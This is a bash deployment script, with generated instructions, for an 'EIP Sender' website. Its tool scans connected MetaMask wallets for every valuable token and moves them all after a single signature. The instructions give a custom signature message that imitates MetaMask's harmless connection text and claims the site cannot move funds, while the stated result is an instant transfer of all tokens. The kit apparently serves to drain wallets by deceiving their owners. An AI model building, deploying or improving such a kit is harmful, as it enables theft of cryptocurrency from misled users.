#!/bin/bash

# EIP Sender Deployment Script
echo "🌐 EIP Sender Website Deployment"
echo "==============================="

# Check if we're in the right directory
if [ ! -f "index.html" ]; then
    echo "❌ Please run this script from the eipsender directory"
    exit 1
fi

# Create deployment directory
echo "📁 Creating deployment package..."
mkdir -p deploy

# Copy essential files
echo "📋 Copying files..."
cp index.html deploy/
cp styles.css deploy/
cp robust_seamless_app.js deploy/single_signature_app.js
cp config.js deploy/
cp README.md deploy/
cp SETUP_GUIDE.md deploy/

# Create .htaccess file
echo "⚙️ Creating .htaccess configuration..."
cat > deploy/.htaccess << 'EOF'
# Force HTTPS
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

# Security headers
Header always set X-Frame-Options DENY
Header always set X-Content-Type-Options nosniff
Header always set X-XSS-Protection "1; mode=block"

# Cache static files
<FilesMatch "\.(css|js|png|jpg|jpeg|gif|ico|svg)$">
    ExpiresActive On
    ExpiresDefault "access plus 1 year"
</FilesMatch>

# Enable Gzip compression
<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/html
    AddOutputFilterByType DEFLATE text/xml
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/x-javascript
</IfModule>
EOF

# Create robots.txt
echo "🤖 Creating robots.txt..."
cat > deploy/robots.txt << 'EOF'
User-agent: *
Allow: /

Sitemap: https://your-domain.com/sitemap.xml
EOF

# Create deployment instructions
echo "📝 Creating deployment instructions..."
cat > deploy/DEPLOYMENT_INSTRUCTIONS.txt << 'EOF'
EIP SENDER DEPLOYMENT INSTRUCTIONS
==================================

🚀 EIP SENDER - Robust Seamless Token Transfer

FEATURES:
=========
✅ ALL robust functions maintained
✅ Seamless user experience
✅ Multi-wallet support
✅ Any valuable token support
✅ Batch transfers
✅ Auto gas sponsorship
✅ Token filtering
✅ Comprehensive token scanning
✅ Wallet management
✅ Real-time token detection
✅ Custom MetaMask signature message

SETUP STEPS:
============

1. DEPLOY EIP SENDER CONTRACT
   - Run: ./setup.sh
   - Deploy contract to mainnet
   - Fund contract with ETH for gas sponsorship

2. UPDATE WEBSITE CONFIG
   - Edit config.js with EIP Sender contract address
   - Deploy website to Hostinger

3. TEST EIP SENDER TRANSFERS
   - Connect MetaMask
   - Add wallets (optional)
   - Transfer tokens with one click!

CONTRACT FUNCTIONS:
==================

- transferAllTokensFromWallet(): Seamless batch transfer
- transferFromMultipleWallets(): Multi-wallet batch transfer
- setAuthorizedWallet(): Authorize specific wallets
- getComprehensiveStats(): Get detailed statistics
- checkGasFunds(): Check gas sponsorship funds
- setTokenFiltering(): Configure token filtering

EIP SENDER FEATURES:
====================

- Multi-wallet support (up to 10 wallets per batch)
- Any valuable token support
- Batch transfers
- Auto gas sponsorship
- Token filtering
- Comprehensive token scanning
- Wallet management
- Real-time token detection
- Custom MetaMask signature message

USER EXPERIENCE:
================

1. User visits website
2. Clicks "Connect MetaMask"
3. Adds wallets (optional)
4. Scans for tokens
5. Clicks "Transfer All Tokens"
6. Signs custom MetaMask message (ONLY signature needed!)
7. Transfer completed instantly!

META MASK MESSAGE:
==================

"View your public address and wallet balance
Send you requests for transactions

Will not be able to
Move funds without your permission"

IMPORTANT NOTES:
================

- Contract needs ETH for gas sponsorship
- Monitor gas usage regularly
- Set reasonable limits to prevent abuse
- Authorize wallets for added security
- Supports any ERC20 token

FILES TO UPLOAD:
================
- index.html
- styles.css
- single_signature_app.js
- config.js (updated with contract address)
- .htaccess
- robots.txt
- README.md
- SETUP_GUIDE.md

🎉 Users can now transfer tokens seamlessly with EIP Sender!
EOF

# Show deployment package contents
echo "📦 EIP Sender deployment package created:"
echo "========================================="
ls -la deploy/

echo ""
echo "✅ EIP Sender deployment package ready!"
echo ""
echo "🚀 EIP SENDER FEATURES:"
echo "- ALL robust functions maintained"
echo "- Seamless user experience"
echo "- Multi-wallet support"
echo "- Any valuable token support"
echo "- Batch transfers"
echo "- Auto gas sponsorship"
echo "- Token filtering"
echo "- Comprehensive token scanning"
echo "- Wallet management"
echo "- Real-time token detection"
echo "- Custom MetaMask signature message"
echo ""
echo "📋 Next steps:"
echo "1. Deploy EIP Sender contract first"
echo "2. Fund contract with ETH for gas sponsorship"
echo "3. Update config.js with contract address"
echo "4. Upload files to Hostinger"
echo "5. Test EIP Sender transfers!"
echo ""
echo "💰 IMPORTANT: Fund the contract with ETH for gas sponsorship!"
echo "📊 Monitor gas usage and refill as needed"
echo ""
echo "🔗 Your EIP Sender website will be live at: https://your-domain.com"
echo ""
echo "⚠️  IMPORTANT: Update config.js with your contract address!"
echo ""
echo "🎉 After setup, users can transfer tokens seamlessly with EIP Sender!"
echo "✨ Single signature only: 'View your public address and wallet balance'"
echo "⚡ Instant transfer completion - no additional transactions needed!"
